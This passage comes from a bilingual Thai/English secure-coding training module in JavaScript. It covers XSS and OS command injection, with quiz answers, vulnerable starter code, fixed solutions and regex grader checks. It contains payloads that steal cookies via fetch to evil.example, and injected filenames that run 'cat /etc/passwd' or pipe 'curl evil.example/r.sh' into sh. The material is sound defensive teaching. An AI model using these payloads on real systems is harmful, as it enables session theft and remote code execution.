          th: 'HTML มีทางรันสคริปต์อีกนับร้อยแบบที่ไม่ต้องใช้ tag script: onerror, onload, ontoggle, onfocus, srcdoc, href="javascript:" ฯลฯ การไล่บล็อกจึงไม่มีวันครบ ทางแก้ที่ถูกต้องคือ encode ค่าตาม context ซึ่งทำให้ทุก payload กลายเป็นข้อความ ไม่ว่ามันจะหน้าตาแบบไหน',
          en: 'HTML offers hundreds of script-execution paths that need no script tag: onerror, onload, ontoggle, onfocus, srcdoc, href="javascript:" and so on, so a blocklist can never be complete. The correct fix is context-aware encoding, which turns every payload into text regardless of its shape.'
        },
        whyWrong: [
          { th: 'ไม่จริง — ทุก event handler attribute (onerror, onload, ontoggle) รัน JavaScript ได้เอง และ href="javascript:..." ก็เช่นกัน', en: 'False — every event-handler attribute (onerror, onload, ontoggle) executes JavaScript on its own, as does href="javascript:...".' },
          null,
          { th: 'case-insensitive แก้ได้แค่ <SCRIPT> เท่านั้น ไม่ได้แตะ payload ที่ไม่มีคำว่า script อยู่เลย และยังโดน <scr<script>ipt> ที่อาศัยการลบครั้งเดียว', en: 'Case-insensitivity only catches <SCRIPT>. It does nothing about payloads that never contain the word script, and it still loses to <scr<script>ipt>, which exploits a single-pass removal.' },
          { th: 'CSP เป็นชั้นป้องกันเสริม ไม่ใช่ตัวแทนของ encoding — นโยบายจริงจำนวนมากยังมี \'unsafe-inline\' และ dangling markup ยังดูดข้อมูลในฟอร์มออกไปได้โดยไม่ต้องรันสคริปต์', en: 'CSP is an extra layer, not a replacement for encoding — many real policies still include \'unsafe-inline\', and dangling-markup injection can exfiltrate form data without executing any script.' }
        ]
      },
      {
        q: {
          th: 'คุณต้องนำค่าจากผู้ใช้ไปใส่ใน attribute แบบ <p data-q=\'...\'> ควรใช้วิธีใด',
          en: 'You need to place a user value inside an attribute like <p data-q=\'...\'>. What should you use?'
        },
        choices: [
          { th: 'encodeURIComponent(value) เพราะมันแปลงอักขระพิเศษให้หมดแล้ว', en: 'encodeURIComponent(value), because it escapes all the special characters' },
          { th: 'JSON.stringify(value) เพราะจะได้สตริงที่ปลอดภัยพร้อม quote', en: 'JSON.stringify(value), because it returns a safely quoted string' },
          { th: 'HTML attribute encoding ที่แปลง & < > " \' และครอบ attribute ด้วย quote เสมอ', en: 'HTML attribute encoding covering & < > " \', with the attribute always quoted' },
          { th: 'value.trim() แล้วจำกัดความยาวไม่เกิน 100 ตัวอักษร', en: 'value.trim() plus a 100-character length cap' }
        ],
        answer: 2,
        why: {
          th: 'ภายใน attribute ที่ครอบด้วย quote อักขระที่ทำให้แหกออกมาได้คือ quote ตัวที่ครอบอยู่ เลยต้อง encode ทั้ง " และ \' (รวมถึง & เพื่อไม่ให้ entity ถูกตีความซ้ำ) แล้วครอบ attribute ด้วย quote เสมอ พอค่าแหกออกจาก quote ไม่ได้ attacker ก็เพิ่ม attribute ใหม่อย่าง onmouseover= ไม่ได้',
          en: 'Inside a quoted attribute the only way out is the quote character itself, so both " and \' must be encoded (plus & so entities are not re-interpreted), and the attribute must always be quoted. If the value cannot escape the quotes, the attacker cannot append a new attribute such as onmouseover=.'
        },
        whyWrong: [
          { th: 'encodeURIComponent ไม่แปลงอักขระ \' เลย (อยู่ในชุดที่ไม่ถูกแปลง) ถ้า attribute ครอบด้วย single quote ก็แหกออกมาได้ทันที และยังทำให้ข้อความที่ผู้ใช้พิมพ์แสดงผลเพี้ยน', en: 'encodeURIComponent leaves the \' character untouched (it is in the unreserved set), so a single-quoted attribute is broken out of immediately — and it mangles what the user typed.' },
          { th: 'JSON.stringify escape ตามกฎของ JavaScript ไม่ใช่ของ HTML มันไม่แปลง < > และ \' ค่าที่ได้จึงยังปิด attribute แล้วเปิด tag ใหม่ได้', en: 'JSON.stringify escapes according to JavaScript rules, not HTML. It does not encode < > or \', so the result can still close the attribute and open a new tag.' },
          null,
          { th: 'trim และการจำกัดความยาวเป็นการตรวจ input ที่ดีในแง่ data quality แต่ไม่เกี่ยวกับการตีความ markup เลย payload อย่าง \' onmouseover=alert(1) x=\' สั้นกว่า 100 ตัวอักษรมาก', en: 'Trimming and a length cap are fine input-quality checks but have nothing to do with markup interpretation — a payload like \' onmouseover=alert(1) x=\' is well under 100 characters.' }
        ]
      }
    ],

    sim: {
      kind: 'html',
      config: {
        template: '<div class="greeting">Hello, {{payload}}!</div>'
      },
      payloads: [
        { label: { th: 'แทรก script เพื่อขโมย cookie ของคนที่เปิดหน้านี้', en: 'Classic script tag — steal the cookie' }, value: "<script>fetch('https://evil.example/?c='+document.cookie)</script>" },
        { label: { th: 'ไม่มีคำว่า script — event handler บน <img>', en: 'No script tag — an event handler on <img>' }, value: "<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">" },
        { label: { th: 'SVG onload — สั้นและผ่าน filter ง่าย', en: 'SVG onload — short and filter-friendly' }, value: '<svg/onload=alert(document.domain)>' }
      ],
      allowCustom: true
    },

    references: [
      { label: 'OWASP Cross Site Scripting Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
      { label: 'OWASP DOM based XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html' },
      { label: 'OWASP Java Encoder', url: 'https://owasp.org/www-project-java-encoder/' }
    ]
  };

 /* ======================================================================
 * 1.3 OS Command Injection
 * ==================================================================== */
  const COMMAND_INJECTION = {
    id: 'command-injection',
    title: { th: 'OS Command Injection', en: 'OS Command Injection' },
    severity: 'Critical',
    cwe: 'CWE-78',
    owasp: 'A03:2021 – Injection',
    category: { th: 'Injection', en: 'Injection' },
    estMinutes: 14,
    points: 150,

    intro: {
      th: 'บริการสร้าง thumbnail ประกอบคำสั่งเป็นสตริงแล้วส่งให้ shell รัน (sh -c ใน Java, child_process.exec ใน Node) จุดสำคัญคือ shell ไม่ได้มองสตริงนั้นเป็น "ชื่อโปรแกรม + argument" แต่มันเป็นภาษาโปรแกรมเต็มรูปแบบที่มอง ; && | ` $() และ newline เป็น syntax ชื่อไฟล์ที่ผู้ใช้ส่งมาเลยกลายเป็นโค้ดที่ shell รันด้วย privilege ของโปรเซสแอปคุณ',
      en: 'The thumbnail service assembles a command as a string and hands it to a shell (sh -c in Java, child_process.exec in Node). The key point is that a shell does not read that string as "program plus arguments" — it is a full programming language in which ; && | ` $() and newline are syntax. The filename the user supplies therefore becomes source code the shell executes with your application process\'s privileges.'
    },
    attack: {
      th: 'ยิง filename=photo.png; cat /etc/passwd แล้ว shell จะรันสองคำสั่งเรียงกัน ถ้าแอปบล็อก ; กับ && ก็ใช้ backtick แทน: photo.png`id` หรือใช้ command substitution: photo.png$(curl -s https://evil.example/r.sh | sh) ที่ดาวน์โหลดและรันสคริปต์ของ attacker ทันที ที่ร้ายกว่าคือ output ของคำสั่งพวกนี้ไม่ต้องกลับมาที่หน้าเว็บเลย attacker เปิด reverse shell ออกไปข้างนอกได้',
      en: 'Send filename=photo.png; cat /etc/passwd and the shell runs two commands in sequence. If the app blocks ; and &&, use backticks instead: photo.png`id`, or command substitution: photo.png$(curl -s https://evil.example/r.sh | sh), which downloads and runs the attacker\'s script immediately. Worse, none of this output needs to come back through the web page — the attacker can simply open an outbound reverse shell.'
    },
    fix: {
      th: 'อย่าให้มี shell อยู่ในเส้นทางเลย เรียกโปรแกรมโดยตรงพร้อมส่ง argument เป็น "รายการ" (ProcessBuilder รับ List ใน Java, execFile(bin, [args]) ใน Node) ระบบปฏิบัติการจะส่ง argv แต่ละช่องถึงโปรเซสปลายทางแบบตรง ๆ ไม่มีขั้นตอน parse ที่ไหนเลย อักขระอย่าง ; หรือ $() จึงเป็นแค่ตัวอักษรธรรมดาในชื่อไฟล์ เสริมด้วย allowlist ของรูปแบบชื่อไฟล์เพื่อกัน argument injection (ชื่อที่ขึ้นต้นด้วย - จะถูกโปรแกรมตีความเป็น option)',
      en: 'Keep a shell out of the path entirely. Invoke the binary directly and pass arguments as a list (ProcessBuilder with a List in Java, execFile(bin, [args]) in Node). The OS delivers each argv slot to the target process verbatim — there is no parsing step anywhere — so characters like ; or $() are just ordinary letters in a filename. Add an allowlist pattern for the filename to also block argument injection (a name beginning with - is read by the program as an option).'
    },
    keyPoints: {
      vuln: [
        { th: 'บริการต่อคำสั่งเป็นสตริงแล้วส่งให้ shell รัน (sh -c ใน Java, exec ใน Node)', en: 'The service builds a command string and hands it to a shell (sh -c / exec).' },
        { th: 'shell มอง ; && | ` $() และ newline เป็น syntax ไม่ใช่แค่ข้อความ', en: 'A shell reads ; && | ` $() and newline as syntax, not as plain text.' },
        { th: 'ชื่อไฟล์จากผู้ใช้เลยกลายเป็นโค้ดที่ shell รันด้วย privilege ของแอป', en: 'The user\'s filename becomes source code the shell runs with the app\'s privileges.' }
      ],
      attack: [
        { th: 'attacker ส่ง filename=photo.png; cat /etc/passwd เมื่อ shell เห็น ; จะมองว่าเป็นตัวคั่นคำสั่ง จึงรันทั้งคำสั่งเดิมและคำสั่ง cat /etc/passwd ต่อกัน', en: 'Send filename=photo.png; cat /etc/passwd and the shell runs two commands in a row.' },
        { th: 'แม้จะบล็อก ; attacker ยังอาจใช้ `id` หรือ $(id) ซึ่ง shell จะรันคำสั่งด้านในก่อนแล้วนำผลลัพธ์มาแทนที่ เรียกว่า command substitution', en: 'Bypass a blocked ; with backticks `id` or $(...) command substitution.' },
        { th: 'payload อย่าง $(curl -s evil/r.sh | sh) สามารถสั่งให้ shell ดาวน์โหลด script จาก attacker แล้วรันทันที หรือใช้เปิด reverse shell กลับเข้ามายัง server', en: 'Send $(curl … | sh) to download and run a script, or open a reverse shell.' }
      ],
      fix: [
        { th: 'เรียกโปรแกรมโดยตรงและส่ง argument เป็น list เช่น ProcessBuilder หรือ execFile(bin, [args]) แทนการประกอบทุกอย่างเป็นสตริงแล้วส่งให้ shell', en: 'Invoke the binary directly, passing arguments as a list (ProcessBuilder / execFile).' },
        { th: 'เมื่อไม่มี shell มาตีความค่า อักขระอย่าง ; หรือ $() จะเป็นเพียงส่วนหนึ่งของ argument เช่น ชื่อไฟล์ ไม่สามารถกลายเป็นคำสั่งใหม่ได้', en: 'Keep the shell out of the path so ; and $() are just letters in a filename.' },
        { th: 'ใช้ allowlist จำกัดรูปแบบของ argument เพิ่มเติม เช่น ชื่อไฟล์ เพื่อป้องกันค่าที่ขึ้นต้นด้วย - แล้วถูกโปรแกรมตีความเป็น option ซึ่งเป็น argument injection', en: 'Add an allowlist for the filename shape to block leading-dash argument injection.' }
      ]
    },
    impact: {
      th: 'attacker สามารถรันคำสั่งบน server ด้วยสิทธิ์ของแอป อ่านไฟล์ config หรือ credential และอาจใช้เครื่องนั้นเป็นจุดเริ่มต้นเพื่อเข้าถึงระบบอื่นในเครือข่ายภายใน',
      en: 'The attacker runs arbitrary commands on your server with the application\'s privileges — effectively owning the host, reading config files full of credentials, and pivoting to other systems on the internal network.'
    },

    caseStudy: {
      year: 2014,
      title: {
        th: 'Shellshock (CVE-2014-6271) — ตัวแปร environment กลายเป็นคำสั่ง',
        en: 'Shellshock (CVE-2014-6271) — environment variables become commands'
      },
      body: {
        th: 'ในเดือนกันยายน 2014 มีการเปิดเผยว่า GNU Bash ทุกเวอร์ชันจนถึง 4.3 รันข้อความที่ต่อท้ายนิยามฟังก์ชันในค่าของ environment variable ทันทีที่ shell เริ่มทำงาน ทำให้ทุกจุดที่ข้อมูลจากภายนอกถูกใส่ลงใน environment แล้วมีการเรียก bash ต่อ กลายเป็นช่องรันคำสั่งจากระยะไกลหมด รวมถึง CGI ของ Apache (mod_cgi ที่แปลง HTTP header เป็น environment variable), DHCP client และ sshd ที่ใช้ ForceCommand NVD ให้คะแนน CVSS v3.1 ที่ 9.8 และแพตช์ชุดแรกยังไม่สมบูรณ์จนต้องออก CVE-2014-7169 ตามมา',
        en: 'In September 2014 it was disclosed that every GNU Bash release up to 4.3 executed text appended after a function definition inside an environment variable, the moment the shell started. Any place where external data reached the environment and bash was then invoked became a remote command execution channel — including Apache CGI (mod_cgi turns HTTP headers into environment variables), DHCP clients, and sshd using ForceCommand. NVD scores it CVSS v3.1 9.8, and the first patch was incomplete, requiring the follow-up CVE-2014-7169.'
      },
      source: {
        label: 'NVD — CVE-2014-6271 (Shellshock)',
        url: 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271'
      }
    },

    codeReview: [
      {
        th: 'ตอน Code Review ให้ค้นหา Runtime.getRuntime().exec, ProcessBuilder, child_process.exec/execSync, os.system, subprocess ที่ shell=True ทุกจุดที่นำค่าจากผู้ใช้มาต่อเป็นคำสั่ง ต้องอ่านละเอียด',
        en: 'grep for Runtime.getRuntime().exec, ProcessBuilder, child_process.exec/execSync, os.system, subprocess with shell=True — every hit deserves a careful read.'
      },
      {
        th: 'ถ้าเห็น "sh", "-c" หรือ "cmd.exe", "/c" อยู่ในรายการ argument หมายความว่ามี shell คั่นกลางแน่นอน และ shell จะตีความ ; | $() ในค่าจากผู้ใช้เป็นคำสั่ง',
        en: 'The clearest signal: "sh", "-c" or "cmd.exe", "/c" appearing in the argument list — that guarantees a shell sits in the middle.'
      },
      {
        th: 'option { shell: true } ใน spawn/execFile ของ Node จะทำให้คำสั่งกลับไปผ่าน shell อีกครั้ง จึงมีความเสี่ยงเหมือน exec แทนที่จะเรียกโปรแกรมโดยตรง',
        en: 'A { shell: true } option on Node\'s spawn/execFile, which reverts the whole thing to exec\'s behaviour.'
      },
      {
        th: 'argument จากผู้ใช้ที่อาจขึ้นต้นด้วย - เช่น --output=/etc/cron.d/x ต่อให้ไม่มี shell ก็ยังเป็น argument injection (โปรแกรมอ่านเป็น option) กันด้วย allowlist หรือใส่ -- คั่นก่อน operand',
        en: 'User-controlled arguments that could start with - (--output=/etc/cron.d/x). Even with no shell that is argument injection — enforce an allowlist pattern, or pass -- before the operands.'
      }
    ],

    testIt: {
      cmd: "curl -s -X POST http://localhost:3000/api/thumbnails -H 'Content-Type: application/json' -d '{\"filename\":\"photo.png; id\"}'",
      note: {
        th: 'แอปที่มีช่องโหว่จะมี output ของคำสั่ง id (uid=... gid=...) ปรากฏใน response หรือใน log ของ server ส่วนแอปที่แก้แล้วจะตอบ error ว่าหาไฟล์ชื่อ "photo.png; id" ไม่พบ — นั่นคือหลักฐานว่าทั้งสตริงถูกส่งไปเป็นชื่อไฟล์ค่าเดียว ไม่ใช่คำสั่ง',
        en: 'A vulnerable app leaks the output of id (uid=... gid=...) into the response or the server log. A fixed app answers with an error saying there is no file called "photo.png; id" — which is exactly the proof that the whole string was delivered as one filename rather than as a command.'
      }
    },

    pitfalls: [
      {
        title: {
          th: 'ใส่ quote ครอบ argument ก่อนส่งเข้า shell',
          en: '"I wrapped the argument in quotes so the shell will not interpret it"'
        },
        why: {
          th: 'quote ที่คุณใส่เองก็เป็นแค่ตัวอักษรในสตริงเดียวกับ payload attacker ส่ง x\'; id; echo \' เข้ามาก็ปิด single quote ของคุณ รันคำสั่ง แล้วเปิด quote ใหม่ให้สมดุลได้พอดี ถ้าคุณใช้ double quote ยิ่งง่ายกว่าเดิม เพราะภายใน double quote ของ shell นั้น `...` และ $(...) และ $VAR ยังถูกขยายตามปกติ — photo.png$(id) ทำงานได้ทั้งที่อยู่ใน double quote ทางแก้ที่ถูกคือไม่มี shell ให้ต้อง quote ตั้งแต่แรก',
          en: 'The quotes you add are just characters in the same string as the payload. An attacker sends x\'; id; echo \' which closes your single quote, runs the command, and reopens a quote so everything balances. Double quotes are even weaker: inside shell double quotes, `...`, $(...) and $VAR still expand — photo.png$(id) executes perfectly well while "quoted". The real fix is to have no shell that needs quoting in the first place.'
        },
        short: {
          th: 'quote ที่ใส่เองก็เป็นแค่ตัวอักษร — attacker ปิด quote แล้วรันคำสั่งได้',
          en: 'Quotes you add are just characters; the attacker closes them and runs commands.'
        }
      },
      {
        title: {
          th: 'บล็อกอักขระ ; และ &&',
          en: '"I block ; and &&"'
        },
        why: {
          th: 'shell มีตัวคั่นและตัวขยายอีกเพียบที่คุณไม่ได้บล็อก: newline (\\n) ทำหน้าที่เหมือน ; ทุกอย่าง, | และ || ก็ต่อคำสั่งได้, backtick `id` และ $(id) ทำ command substitution, ${IFS} ใช้แทนช่องว่าง, > และ >> เขียนไฟล์ทับได้ (เช่นเขียน crontab) และ & ตัวเดียวก็สั่งรันเบื้องหลังได้ นี่คือ denylist ที่ต้องถูกทุกครั้ง เจอ attacker ที่ขอถูกครั้งเดียว ตัดวงจรด้วยการไม่ใช้ shell ไปเลยดีกว่า',
          en: 'The shell has plenty of separators and expansions you did not block: a newline (\\n) behaves exactly like ;, | and || chain commands, backticks `id` and $(id) do command substitution, ${IFS} substitutes for a space, > and >> overwrite files (a crontab, for instance), and a single & backgrounds a command. This is a denylist that must be right every time against an attacker who needs to be right once. Break the loop by removing the shell instead.'
        },
        short: {
          th: 'ยังเหลือ newline | backtick $() ${IFS} > & — denylist ไม่สามารถครบ',
          en: 'Newline, |, backticks, $(), ${IFS}, > and & remain — no denylist is complete.'
        }
      },
      {
        title: {
          th: 'ใช้ argv array แล้วเลิกตรวจค่าที่รับมา',
          en: '"With an argv array I am 100% safe"'
        },
        why: {
          th: 'argv array ปิดช่อง command injection ได้จริง แต่ยังเหลือ argument injection: ถ้าชื่อไฟล์ที่ผู้ใช้ส่งมาขึ้นต้นด้วย - โปรแกรมปลายทางจะตีความเป็น option ไม่ใช่ชื่อไฟล์ (เช่น ส่ง --version หรือใน git/curl มี option ที่เขียนไฟล์หรือรัน helper ได้) ให้ตรวจรูปแบบด้วย allowlist ที่บังคับให้ตัวแรกเป็นตัวอักษรหรือตัวเลข และถ้าโปรแกรมรองรับ ให้ใส่ -- คั่นก่อนรายการ operand เสมอ',
          en: 'An argv array does close command injection, but argument injection remains: if the user\'s filename starts with -, the target program reads it as an option rather than a file (--version, or in tools like git and curl, options that write files or run helpers). Validate the shape with an allowlist that forces the first character to be alphanumeric, and where the program supports it, always pass -- before the operands.'
        },
        short: {
          th: 'argv array ปิด command injection แต่ยังเหลือ argument injection',
          en: 'An argv array closes command injection but argument injection remains.'
        }
      }
    ],

    languages: {
      java: {
        filename: 'ThumbnailService.java',
        lang: 'java',
        starter:
`package com.acme.media;

import java.io.IOException;

/** สร้าง thumbnail ด้วย ImageMagick */
public class ThumbnailService {

 // filename มาจาก JSON body ที่ client ส่งมา
    public int makeThumbnail(String filename) throws IOException, InterruptedException {
        String cmd = "/usr/bin/convert /srv/app/user-files/" + filename
                   + " -resize 200x200 /tmp/out.png";
 // ใช้ sh -c เพื่อให้ shell ขยาย path และ glob ให้
        Process p = Runtime.getRuntime().exec(new String[]{ "sh", "-c", cmd });
        p.waitFor();
        return p.exitValue();
    }
}`,
        solution:
`package com.acme.media;

import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;

public class ThumbnailService {

    private static final Path UPLOADS = Paths.get("/srv/app/user-files");

 // allowlist: ต้องขึ้นต้นด้วยตัวอักษร/ตัวเลข เพื่อกัน argument injection จากชื่อที่ขึ้นต้นด้วย -
    private static final Pattern SAFE_NAME =
            Pattern.compile("^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$");

    public int makeThumbnail(String filename) throws IOException, InterruptedException {
        if (filename == null || !SAFE_NAME.matcher(filename).matches()) {
            throw new IllegalArgumentException("invalid filename");
        }
        Path src = UPLOADS.resolve(filename).normalize();

 // ไม่มี shell คั่นกลาง: argument แต่ละตัวเป็นสมาชิกหนึ่งช่องของ argv
        List<String> argv = Arrays.asList("/usr/bin/convert", src.toString(),
                "-resize", "200x200", "/tmp/out.png");
        Process p = new ProcessBuilder(argv).redirectErrorStream(true).start();
        p.waitFor();
        return p.exitValue();
    }
}`,
        explain: {
          th: 'ProcessBuilder ที่รับ List จะเรียก execve ของระบบปฏิบัติการโดยส่ง argv ทีละช่องโดยตรง ไม่มี shell มา parse สตริงตรงกลางเลย ค่าที่ผู้ใช้ส่งมาจึงถูกส่งถึง convert เป็น "argument หนึ่งตัว" เสมอ ต่อให้ข้างในมี ; หรือ $(id) หรือ newline ก็เป็นแค่ตัวอักษรในชื่อไฟล์ นอกจากนี้ SAFE_NAME ยังบังคับให้ชื่อไฟล์ขึ้นต้นด้วยตัวอักษรหรือตัวเลข ตัด argument injection (ชื่อที่ขึ้นต้นด้วย -) ทิ้งอีกชั้น ข้อควรจำ: ProcessBuilder("sh", "-c", cmd) ยังอันตรายเหมือนเดิม สิ่งที่ปลอดภัยคือการไม่มี shell ไม่ใช่ชื่อคลาสที่ใช้',
          en: 'ProcessBuilder with a List calls the OS execve, handing over argv slot by slot — no shell parses anything in between. The user value therefore always arrives at convert as exactly one argument; a ; or $(id) or newline inside it is just a character in a filename. SAFE_NAME additionally forces the name to start with an alphanumeric character, removing argument injection (names beginning with -) as a second layer. Remember: ProcessBuilder("sh", "-c", cmd) is every bit as dangerous as before — what makes this safe is the absence of a shell, not the class name.'
        },
        checks: [
          {
            id: 'no-shell-invocation',
            label: { th: 'ไม่มี shell อยู่ในเส้นทางการเรียก (ไม่มี "sh"/"-c"/cmd.exe)', en: 'No shell anywhere in the call path (no "sh"/"-c"/cmd.exe)' },
            hint: { th: 'ลบ "sh", "-c" ออกจากรายการ argument แล้วเรียก /usr/bin/convert โดยตรง', en: 'Remove "sh", "-c" from the argument list and invoke /usr/bin/convert directly' },
            weight: 3,
            mustNotMatch: /['"](?:\/bin\/)?(?:sh|bash|zsh|ksh)['"]|['"]-c['"]|cmd(?:\.exe)?['"]?\s*,\s*['"]\/c/i
          },
          {
            id: 'no-runtime-exec',
            label: { th: 'ไม่ใช้ Runtime.getRuntime().exec()', en: 'Does not use Runtime.getRuntime().exec()' },
            hint: { th: 'เปลี่ยนไปใช้ new ProcessBuilder(argv).start()', en: 'Switch to new ProcessBuilder(argv).start()' },
            weight: 2,
            mustNotMatch: /Runtime\s*\.\s*getRuntime|\.exec\s*\(/
          },
          {
            id: 'use-process-builder',
            label: { th: 'ใช้ ProcessBuilder พร้อมรายการ argument', en: 'Uses ProcessBuilder with an argument list' },
            hint: { th: 'สร้าง List<String> argv แล้วส่งให้ new ProcessBuilder(argv)', en: 'Build a List<String> argv and pass it to new ProcessBuilder(argv)' },
            weight: 3,
            mustMatch: /new\s+ProcessBuilder\s*\(/
          },
          {
            id: 'no-command-concat',
            label: { th: 'ไม่ต่อ filename เข้ากับสตริงคำสั่ง', en: 'The filename is never concatenated into a command string' },
            hint: { th: 'อย่าสร้างตัวแปร cmd ด้วยการต่อสตริง ให้ใส่ filename เป็นสมาชิกหนึ่งตัวของ argv', en: 'Do not assemble a cmd string — put filename in its own argv slot' },
            weight: 2,
            mustNotMatch: /\+\s*filename\b|\bfilename\s*\+/
          },
          {
            id: 'validate-filename-allowlist',
            label: { th: 'ตรวจรูปแบบชื่อไฟล์ด้วย allowlist', en: 'Validates the filename against an allowlist pattern' },
            hint: { th: 'ใช้ Pattern.compile("^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$") แล้ว matches() ก่อนเรียกโปรแกรม', en: 'Use Pattern.compile("^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$") and matches() before invoking the binary' },
            weight: 1,
            mustMatch: /Pattern\s*\.\s*compile\s*\(|\.matches\s*\(|ALLOWED|allowlist/i
          }
        ],
        traps: [
          {
            id: 'quote-the-argument',
            match: /'"\s*\+\s*filename|filename\s*\+\s*"'|\\"\s*\+\s*filename|filename\s*\+\s*"\\"/,
            message: {
              th: 'การใส่ quote ครอบ argument ในสตริงคำสั่งไม่ช่วยอะไร: single quote ของคุณถูกปิดได้ด้วย payload x\'; id; echo \' และภายใน double quote ของ shell นั้น `id` กับ $(id) ยังขยายตามปกติ ทางแก้คือเอา shell ออกไปแล้วส่ง argument เป็นสมาชิกของ List',
              en: 'Wrapping the argument in quotes inside a command string helps nothing: your single quote is closed by the payload x\'; id; echo \', and inside shell double quotes `id` and $(id) still expand. The fix is to remove the shell and pass the argument as a List element.'
            }
          },
          {
            id: 'metachar-denylist',
            match: /(?:replace(?:All|First)?|contains|indexOf|matches)\s*\(\s*"[^"]*[;&|><`$]/,
            message: {
              th: 'denylist ของอักขระพิเศษไม่ครบแน่นอน: newline ทำหน้าที่เหมือน ; ทุกประการ, ${IFS} แทนช่องว่างได้, backtick และ $() ทำ command substitution, > เขียนไฟล์ทับ และยังมีการเข้ารหัสซ้อนอีกหลายชั้น เปลี่ยนไปใช้ argv array แล้วอักขระเหล่านี้จะไม่มีความหมายพิเศษอีกเลย',
              en: 'A denylist of metacharacters is never complete: a newline behaves exactly like ;, ${IFS} substitutes for a space, backticks and $() do command substitution, > overwrites files, and there are several layers of encoding on top. Move to an argv array and those characters stop having any special meaning at all.'
            }
          }
        ]
      },

      node: {
        filename: 'thumbnailService.js',
        lang: 'js',
        starter:
`const { exec } = require('child_process');
const util = require('util');
const execAsync = util.promisify(exec);

// POST /api/thumbnails { filename } — filename มาจาก client
async function makeThumbnail(filename) {
  const cmd = '/usr/bin/convert /srv/app/user-files/' + filename +
              ' -resize 200x200 /tmp/out.png';
  const { stdout } = await execAsync(cmd);
  return stdout;
}

module.exports = { makeThumbnail };`,
        solution:
`const { execFile } = require('child_process');
const util = require('util');
const path = require('path');
const execFileAsync = util.promisify(execFile);

const UPLOADS = '/srv/app/user-files';

// allowlist: ต้องขึ้นต้นด้วยตัวอักษร/ตัวเลข เพื่อกัน argument injection จากชื่อที่ขึ้นต้นด้วย -
const SAFE_NAME = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/;

async function makeThumbnail(filename) {
  if (!SAFE_NAME.test(String(filename))) {
    throw new Error('invalid filename');
  }
  const src = path.join(UPLOADS, filename);

 // ไม่มี shell คั่นกลาง: argv เป็น array ค่าแต่ละตัวถูกส่งตรงถึงโปรเซส
  const { stdout } = await execFileAsync('/usr/bin/convert',
    [src, '-resize', '200x200', '/tmp/out.png']);
  return stdout;
}

module.exports = { makeThumbnail };`,
        explain: {
          th: 'execFile() เรียกโปรแกรมโดยตรงผ่าน execvp โดยไม่ผ่าน /bin/sh เหมือน exec() แต่ละสมาชิกใน array จึงถูกส่งเป็น argv คนละช่อง ไม่มี word splitting, glob expansion หรือ command substitution ค่า photo.png; id จึงเป็นชื่อไฟล์หนึ่งค่า ไม่ใช่สองคำสั่ง SAFE_NAME ช่วยป้องกัน argument injection เพิ่มอีกชั้น และห้ามเปิด { shell: true } เพราะจะนำ shell กลับเข้ามาและทำให้เสี่ยงเหมือน exec()',
          en: 'execFile() invokes the binary directly through execvp rather than routing through /bin/sh as exec() does, so each array element reaches the convert process as exactly one argv slot — no word splitting, no glob expansion, no command substitution. The value photo.png; id arrives as a single filename that happens to contain a semicolon (and convert reports the file does not exist). SAFE_NAME adds a second layer against argument injection. One critical caveat: never add { shell: true }, because it drags /bin/sh back in and makes execFile exactly as dangerous as exec.'
        },
        checks: [
          {
            id: 'no-shell-invocation',
            label: { th: 'ไม่ใช้ exec/execSync และไม่เรียก sh โดยตรง', en: 'No exec/execSync and no direct sh invocation' },
            hint: { th: 'เปลี่ยน require({ exec }) เป็น { execFile } และห้ามใส่ "sh", "-c" ในรายการ argument', en: 'Change require({ exec }) to { execFile } and never put "sh", "-c" in the argument list' },
            weight: 3,
            mustNotMatch: /\bexec\b|\bexecSync\b|['"](?:\/bin\/)?(?:sh|bash|zsh|ksh)['"]|['"]-c['"]/
          },
          {
            id: 'no-shell-option',
            label: { th: 'ไม่เปิดตัวเลือก shell: true', en: 'Does not enable the shell: true option' },
            hint: { th: 'ลบ { shell: true } ออก เพราะมันพา /bin/sh กลับมาและทำให้ช่องโหว่กลับมาทั้งหมด', en: 'Remove { shell: true } — it reintroduces /bin/sh and the entire vulnerability with it' },
            weight: 2,
            mustNotMatch: /shell\s*:\s*true/
          },
          {
            id: 'use-exec-file',
            label: { th: 'ใช้ execFile หรือ spawn (เรียกไบนารีตรง ๆ)', en: 'Uses execFile or spawn (direct binary invocation)' },
            hint: { th: "เรียก execFile('/usr/bin/convert', [...]) แทน exec(cmd)", en: "Call execFile('/usr/bin/convert', [...]) instead of exec(cmd)" },
            weight: 3,
            mustMatch: /execFile(?:Sync|Async)?\s*\(|\bspawn(?:Sync)?\s*\(/
          },
          {
            id: 'args-as-array',
            label: { th: 'ส่ง argument เป็น array แยกจากชื่อโปรแกรม', en: 'Passes arguments as an array separate from the binary' },
            hint: { th: "argument ตัวที่สองต้องเป็น array เช่น [src, '-resize', '200x200', '/tmp/out.png']", en: "The second argument must be an array, e.g. [src, '-resize', '200x200', '/tmp/out.png']" },
            weight: 2,
            mustMatch: /\(\s*['"][^'"]+['"]\s*,\s*\[/
          },
          {
            id: 'validate-filename-allowlist',
            label: { th: 'ตรวจรูปแบบชื่อไฟล์ด้วย allowlist', en: 'Validates the filename against an allowlist pattern' },
            hint: { th: 'ใช้ /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(filename) ก่อนเรียกโปรแกรม', en: 'Use /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(filename) before invoking the binary' },
            weight: 1,
            mustMatch: /SAFE_NAME|\.test\s*\(|ALLOWED|allowlist/i
          }
        ],
        traps: [
          {
            id: 'quote-the-argument',
            match: /["']\s*\+\s*filename\b|\bfilename\s*\+\s*["']|\$\{\s*filename\s*\}/,
            message: {
